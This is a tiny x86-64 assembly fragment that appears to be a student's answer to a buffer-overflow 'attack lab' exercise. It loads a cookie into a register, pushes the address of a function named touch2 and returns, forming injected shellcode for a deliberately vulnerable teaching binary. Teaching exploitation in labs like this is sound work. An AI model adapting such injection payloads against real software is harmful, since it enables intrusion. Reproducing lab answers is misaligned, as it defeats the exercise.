# Pass my cookie as the first parameter to <touch2>
movl $0x11560ebd,%edi
# Set return address to that of <touch2>
pushq $0x000000000040194c
# Return (go to <touch2>)
retq
